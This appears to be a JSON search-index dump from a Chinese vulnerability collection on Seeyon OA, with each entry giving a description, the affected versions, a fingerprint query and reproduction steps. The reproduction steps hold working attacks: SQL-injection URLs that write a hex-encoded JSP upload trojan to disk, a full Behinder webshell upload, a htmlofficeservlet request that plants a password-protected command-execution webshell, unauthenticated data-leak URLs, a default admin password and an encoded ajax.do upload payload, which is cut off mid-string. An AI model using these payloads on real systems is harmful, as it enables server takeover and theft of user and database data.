","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-createmysql.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-createmysql.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"漏洞复现 当访问如下URL时执行了SQL语句 select *from mysql.user; 进行查询并返回到页面中 /yyoa/createMysql.jsp /yyoa/ext/createMysql.jsp ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-createmysql.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-createmysql.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"致远OA A6 DownExcelBeanServlet 用户敏感信息泄露 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-downexcelbeanservlet-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-downexcelbeanservlet-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"漏洞描述 致远OA A6 存在某个未授权的接口导致任意访问者可下载OA中的用户信息 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-downexcelbeanservlet-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-downexcelbeanservlet-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"漏洞影响 致远OA A6 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-downexcelbeanservlet-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-downexcelbeanservlet-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"网络测绘 title=\"致远A8+协同管理软件.A6\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-downexcelbeanservlet-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-downexcelbeanservlet-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"漏洞复现 访问如下URL即可跳转下载用户信息文件 /yyoa/DownExcelBeanServlet?contenttype=username\u0026contentvalue=\u0026state=1\u0026per_id=0 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-downexcelbeanservlet-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-downexcelbeanservlet-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"致远OA A6 initDataAssess.jsp 用户敏感信息泄露 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-initdataassess.jsp-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-initdataassess.jsp-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"洞描述 致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露 可以通过得到的用户名爆破用户密码进入后台进一步攻击 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-initdataassess.jsp-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-initdataassess.jsp-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"漏洞影响 致远OA A6 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-initdataassess.jsp-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-initdataassess.jsp-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"网络测绘 title=\"致远A8+协同管理软件.A6\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-initdataassess.jsp-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-initdataassess.jsp-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"漏洞复现 访问下列URL泄露用户信息 http://xxx.xxx.xxx.xxx/yyoa/assess/js/initDataAssess.jsp ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-initdataassess.jsp-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-initdataassess.jsp-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"致远OA A6 setextno.jsp SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-setextno.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-setextno.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 致远OA A6 setextno.jsp 存在sql注入漏洞，并可以通过注入写入webshell文件控制服务器 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-setextno.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-setextno.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 致远OA A6 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-setextno.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-setextno.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"致远A8+协同管理软件.A6\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-setextno.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-setextno.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问如下Url，其中含有 union注入 /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4# 查看web路径 写入文件上传木马 http://xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(select unhex('3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E') into outfile 'D:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/test_upload.jsp'),4# ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-setextno.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-setextno.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"致远OA A6 test.jsp SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 致远OA A6 test.jsp 存在sql注入漏洞，并可以通过注入写入webshell文件控制服务器 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 致远OA A6 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"致远A8+协同管理软件.A6\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问URL http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101\u0026S1=(SELECT%20database()) 返回了当前使用的数据库, 要想写入shell需要知道写入的路径 这里得到路径 D:\\Program Files\\UFseeyon\\OA\\mysql\\bin..\\ 通过 into outfile 写入文件，这里因为 jsp木马存在特殊符号，使用 hex编码 上传允许文件上传的jsp文件 \u003c%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());%\u003e HEX编码 3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C5C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E /yyoa/common/js/menu/test.jsp?doType=101\u0026S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27E:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/test_upload.jsp%27 显示上图则上传成功，访问 test_upload.jsp 为空白不报错页面不存在就是上传成功 在发送请求包上传webshell，这里上传冰蝎 POST /yyoa/peiqi_upload.jsp?f=testwebshell.jsp t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E 连接木马 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"致远OA A8 htmlofficeservlet 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a8-htmlofficeservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a8-htmlofficeservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 该漏洞最早于6月26号左右，有安全厂商发出漏洞预警。 远程攻击者在无需登录的情况下可通过向 URL /seeyon/htmlofficeservlet POST 精心构造的数据即可向目标服务器写入任意文件，写入成功后可执行任意系统命令进而控制目标服务器。 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a8-htmlofficeservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a8-htmlofficeservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"致远A8-V5协同管理软件 V6.1sp1\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a8-htmlofficeservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a8-htmlofficeservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 致远A8-V5协同管理软件V6.1sp1 致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远A8+协同管理软件V7.1 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a8-htmlofficeservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a8-htmlofficeservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问目标站点 /seeyon/htmlofficeservlet 出现如下图响应，则可能含有漏洞 使用POST请求发出如下请求包 DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 \u003c%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%\u003e\u003c%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %\u003e\u003c%if(\"calsee\".equals(request.getParameter(\"pwd\"))\u0026\u0026!\"\".equals(request.getParameter(\"cmd\"))){out.println(\" \u003cpre\u003e\"+excuteCmd(request.getParameter(\"cmd\")) + \"\u003c/pre\u003e\");}else{out.println(\":-)\");}%\u003e\u003ea6e4f045d4b8506bf492ada7e3390d7ce 出现如图响应则为上传成功,访问 /seeyon/testtesta.jsp?pwd=calsee\u0026cmd=cmd+/c+dir ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a8-htmlofficeservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a8-htmlofficeservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"致远OA A8 status.jsp 信息泄露漏洞 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a8-status.jsp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a8-status.jsp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 致远OA A8-m 存在状态监控页面信息泄露，攻击者可以从其中获取网站路径和用户名等敏感信息进一步攻击 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a8-status.jsp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a8-status.jsp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 致远OA A8-m ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a8-status.jsp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a8-status.jsp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"A8-m\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a8-status.jsp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a8-status.jsp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问监控页面 /seeyon/management/status.jsp 后台密码为 WLCCYBD@SEEYON 登录后通过如下url获得一些敏感信息 /seeyon/management/status.jsp /seeyon/logs/login.log /seeyon/logs/v3x.log ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a8-status.jsp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a8-status.jsp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"致远OA ajax.do 任意文件上传 CNVD-2021-01627 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-ajax.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cnvd-2021-01627/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-ajax.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cnvd-2021-01627/"},{"categories":null,"content":"漏洞描述 致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-ajax.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cnvd-2021-01627/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-ajax.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cnvd-2021-01627/"},{"categories":null,"content":"漏洞影响 致远OA V8.0 致远OA V7.1、V7.1SP1 致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3 致远OA V6.0、V6.1SP1、V6.1SP2 致远OA V5.x 致远OA G6 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-ajax.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cnvd-2021-01627/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-ajax.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cnvd-2021-01627/"},{"categories":null,"content":"漏洞复现 通过请求判断是否可能存在漏洞 /seeyon/thirdpartyController.do.css/..;/ajax.do 查看是否出现如上图异常，若存在则可能出现漏洞 出现异常：java.lang.NullPointerException:null 调用未授权的文件上传接口上传webshell文件，请求包如下 POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction\u0026managerName=formulaManager\u0026requestCompress=gzip HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 loginPageURL=; login_locale=zh_CN; Content-Type: application/x-www-form-urlencoded managerMethod=validate\u0026arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%